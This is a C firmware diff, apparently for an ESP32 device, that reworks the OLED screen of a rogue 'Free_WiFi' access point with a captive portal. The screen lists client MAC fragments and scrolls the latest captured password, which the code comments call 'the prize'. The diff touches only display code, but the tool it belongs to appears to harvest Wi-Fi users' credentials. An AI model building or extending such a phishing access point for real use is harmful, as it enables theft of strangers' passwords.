@@ -235,17 +235,28 @@ static void render_picker(void) {
 }
 
 static void render_running(void) {
-    ssd1306_clear_buffer();
+    // Scroll state — persists across renders, resets on new capture
+    static uint8_t pw_scroll_offset  = 0;
+    static uint8_t pw_scroll_tick    = 0;
+    static uint8_t pw_last_cap_count = 0;
 
+    ssd1306_clear_buffer();
     ssd1306_draw_header("AP Mode", ap_ssid[0] ? ap_ssid : "Free_WiFi");
 
     xSemaphoreTake(client_mutex, portMAX_DELAY);
-    uint8_t  count      = client_count;
+    uint8_t  count = client_count;
     ap_client_t snap[MAX_AP_CLIENTS];
     memcpy(snap, clients, sizeof(ap_client_t) * count);
     xSemaphoreGive(client_mutex);
 
     uint8_t cap_count = captive_portal_get_count();
+
+    // Reset scroll when a new password arrives
+    if (cap_count != pw_last_cap_count) {
+        pw_scroll_offset  = 0;
+        pw_scroll_tick    = 0;
+        pw_last_cap_count = cap_count;
+    }
 
     // Row 2: IP
     ssd1306_draw_string(0, 2, AP_IP);
@@ -256,24 +267,10 @@ static void render_running(void) {
              ap_channel, count, cap_count);
     ssd1306_draw_string(0, 3, line);
 
-    // Row 4: latest captured password (the prize) — replaces first client slot
-    if (cap_count > 0) {
-        const cp_capture_t *cap = captive_portal_get_latest();
-        if (cap) {
-            // "pw:" + up to 13 chars of password fits the 16-char display
-            snprintf(line, sizeof(line), "pw:%.13s", cap->password);
-            ssd1306_draw_string(0, 4, line);
-        }
-    } else if (count == 0) {
-        ssd1306_draw_string(0, 4, " Waiting...");
-    }
-
-    // Rows 5–6: clients (last 3 MAC bytes + age). If a password is shown on
-    // row 4, clients start on row 5; otherwise they start on row 4.
-    uint8_t base_row     = (cap_count > 0) ? 5 : 4;
-    uint8_t max_to_show  = (cap_count > 0) ? 2 : 3;
-    int64_t now          = esp_timer_get_time();
-    for (uint8_t i = 0; i < count && i < max_to_show; i++) {
+    // Rows 4–5: up to 2 clients (last 3 MAC bytes + [NEW] tag + age)
+    int64_t now   = esp_timer_get_time();
+    uint8_t shown = 0;
+    for (uint8_t i = 0; i < count && shown < 2; i++, shown++) {
         int64_t raw_age = (now - snap[i].connected_at_us) / 1000000LL;
         if (raw_age < 0) raw_age = 0;
         uint32_t age_s = (uint32_t)raw_age;
@@ -287,9 +284,40 @@ static void render_running(void) {
                  snap[i].mac[3], snap[i].mac[4], snap[i].mac[5],
                  age_s < NEW_CLIENT_SECS ? "[NEW]" : "     ",
                  age);
-        ssd1306_draw_string(0, base_row + i, line);
+        ssd1306_draw_string(0, 4 + shown, line);
+    }
+    if (shown == 0) {
+        ssd1306_draw_string(0, 4, " Waiting...");
     }
 
+    // Row 6: latest captured password — scrolls when longer than 13 chars
+    if (cap_count > 0) {
+        const cp_capture_t *cap = captive_portal_get_latest();
+        if (cap) {
+            size_t pw_len = strlen(cap->password);
+            if (pw_len > 13) {
+                // Advance one char every 4 renders (~400ms at 100ms loop rate)
+                pw_scroll_tick++;
+                if (pw_scroll_tick >= 4) {
+                    pw_scroll_tick = 0;
+                    if (pw_scroll_offset + 13 >= pw_len) {
+                        pw_scroll_offset = 0;   // wrap back to start
+                    } else {
+                        pw_scroll_offset++;
+                    }
+                }
+                if (pw_scroll_offset >= pw_len) pw_scroll_offset = 0;
+            } else {
+                pw_scroll_offset = 0;
+                pw_scroll_tick   = 0;
+            }
+            snprintf(line, sizeof(line), "pw:%-13.13s",
+                     cap->password + pw_scroll_offset);
+            ssd1306_draw_string(0, 6, line);
+        }
+    }
+
+    // Row 7: exit hint always visible
     ssd1306_draw_string(0, 7, "LN>stop");
     ssd1306_flush();
 }
